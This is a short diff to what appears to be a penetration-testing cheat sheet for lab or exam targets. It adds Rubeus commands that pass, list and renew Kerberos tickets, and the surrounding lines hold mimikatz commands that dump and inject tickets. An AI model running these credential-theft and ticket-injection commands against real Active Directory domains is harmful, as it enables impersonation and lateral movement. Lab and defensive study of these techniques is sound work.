@@ -300,6 +300,10 @@ impacket-mssqlclient -k dc.sequel.htb
 sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
 
+Rubeus.exe ptt /ticket:C:\path\to\your\ticket.kirbi
+Rubeus.exe klist
+Rubeus.exe renew /ticket:ticket.kirbi /ptt
+
 # Set the TGT for impacket use
 export KRB5CCNAME=<TGT_ccache_file>
 
